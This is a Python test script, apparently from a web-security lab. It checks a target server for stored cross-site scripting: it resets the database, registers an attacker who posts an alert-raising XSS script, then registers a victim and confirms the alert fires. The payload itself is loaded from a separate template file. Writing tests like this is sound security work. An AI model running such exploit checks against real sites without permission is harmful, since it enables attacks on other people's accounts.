from requests import session, get
from sys import argv
from random import randint
from Common.Driver import runAlert, getScript

SERVER = argv[1]

victimSession = session()
victimUsername = str(randint(2 ** 27, 2 ** 28))
victimPassword = str(randint(2 ** 27, 2 ** 28))
attackerSession = session()
attackerUsername = str(randint(2 ** 27, 2 ** 28))
attackerPassword = str(randint(2 ** 27, 2 ** 28))
alrText = "Exploited" + str(randint(2 ** 27, 2 ** 28))
scrPath = "Common/Scripts/XSS/DisplaysAlert.html"

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

# Attacker Registration
data = {
    "username": attackerUsername,
    "password": attackerPassword
}
r = attackerSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert attackerUsername in r.text

# Attacker Creates a Post
sArgs = {
    "alert": alrText
}
scr = getScript(scrPath, sArgs=sArgs)
data = {
    "content": scr,
    "type": "Public"
}
r = attackerSession.post(SERVER + "/create_post", data=data)

assert scr in r.text

# Victim Registration
data = {
    "username": victimUsername,
    "password": victimPassword
}
r = victimSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername in r.text

# Victim Checks Posts
# Asserting Alert
runAlert(SERVER, SERVER, victimSession, alrText)

print("Success!")
victimSession.close()
attackerSession.close()
